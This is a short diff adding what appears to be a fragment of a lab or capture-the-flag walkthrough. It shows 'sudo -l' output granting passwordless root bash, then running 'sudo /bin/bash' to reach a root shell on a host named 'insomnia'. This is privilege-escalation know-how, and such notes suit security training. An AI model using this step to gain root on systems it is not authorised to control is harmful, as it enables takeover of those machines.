@@ -1,0 +1,9 @@
+sudo -l
+
+User may run the following commands:
+(ALL) NOPASSWD: /bin/bash
+
+Executing:
+sudo /bin/bash
+
+root@insomnia:~#
